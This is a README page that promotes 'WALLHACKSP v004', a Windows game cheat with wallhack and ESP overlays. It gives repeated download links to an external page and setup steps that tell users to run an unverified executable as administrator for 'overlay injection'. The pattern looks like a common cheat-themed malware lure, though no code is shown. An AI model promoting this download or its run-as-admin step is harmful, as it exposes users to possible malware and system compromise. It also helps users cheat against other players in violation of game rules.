# WALLHACKSP v004 - Visual Enhancement Utility for Windows Games

> **A compact script for supported Windows games that adds visual assistance, including wallhack and ESP features, to improve in-game awareness.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henry-young48/wallhacksp-v004-windows-esp?style=flat-square)](https://github.com/henry-young48/wallhacksp-v004-windows-esp)

---

<p align="center">
  <a href="https://henry-young48.github.io/wallhacksp-v004-windows-esp/">
    <img src="https://img.shields.io/badge/Download-WALLHACKSP%20Script-brightgreen?style=for-the-badge" alt="Download WALLHACKSP Script">
  </a>
</p>

> **[Direct Download - WALLHACKSP](https://henry-young48.github.io/wallhacksp-v004-windows-esp/)**

---

[Download Latest Build](https://henry-young48.github.io/wallhacksp-v004-windows-esp/)

---

## What It Does

WALLHACKSP v004 is a Windows-oriented game utility script meant to support players with overlay-based visual cues. It presents information about entities that would normally be hidden by map geometry, combining wallhack-style visibility with ESP (Extra Sensory Perception) data such as names, health, and distance readouts. In this version, the overlay drawing has been tuned to run more smoothly and to keep the screen less crowded.

The script works as a lightweight overlay that hooks into compatible game clients without changing game files. It is aimed at users who want a stronger tactical picture of the battlefield by seeing more of what is happening around them. This release keeps the emphasis on steadiness and broad Windows compatibility, while also focusing on frame-rate-friendly behavior during busy matches.

## Script Features

- Wallhack overlay that renders opponent models through solid objects
- ESP system displaying player names, health status, and distance indicators
- Customizable color schemes for enemy, teammate, and neutral entities
- Toggleable on-screen information panels for real-time data
- Adjustable render distance to balance performance and awareness
- Hotkey-based activation and deactivation during gameplay
- Low system resource footprint for minimal impact on game performance
- Compatibility with multiple game resolutions and aspect ratios

## Setup

1. Download the latest build from the link above.
2. Extract the contents of the `wallhacksp-004` folder to a convenient location on your system.
3. Run the script executable as an administrator (required for overlay injection).
4. Launch your target game and press the default activation hotkey (Insert) to enable the overlay.

Minimal usage example:  
- Start script -> Launch game -> Press Insert -> Overlay appears

## Options

| Setting | Default | Description |
|---------|-------------|-------------|
| Activation Key | Insert | Toggle the overlay on/off |
| ESP Distance | 300m | Maximum range for ESP markers |
| Wallhack Mode | Full | Full, Outline, or Disabled |
| Color Theme | Default | Default, High Contrast, Custom |
| Show Health | Yes | Display health bars on ESP |
| Show Names | Yes | Display player names on ESP |

## Compatibility

- Supported OS: Windows 10 (build 1809+) and Windows 11
- Supported games: Most DirectX 9, 10, and 11 titles (tested on popular FPS titles)
- Known limitations: May conflict with anti-cheat software in online multiplayer modes; not recommended for use on official competitive servers. Performance may vary on systems with less than 8GB RAM.

## FAQ

**How do I get the script running?**  
Grab the build, unpack the folder, start the executable with administrator rights, then open your game. By default, the Insert key turns the overlay on.

**What is the update process?**  
Move the new release files over the existing installation from the latest download. Your settings remain in a separate configuration file, so they carry over between versions.

**Can I change the overlay look and content?**  
Yes. The configuration file lets you adjust colors, transparency, and the ESP items shown on screen. The available choices are listed in the options table above.

**Does it work with every game?**  
It is compatible with most Windows games built on DirectX 9 through 11. Titles that use custom rendering systems or Vulkan may not be supported.

**Where are the configuration settings saved?**  
They are stored in a `config.ini` file inside the script's main folder. You can copy or back up that file to move your preferences elsewhere.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
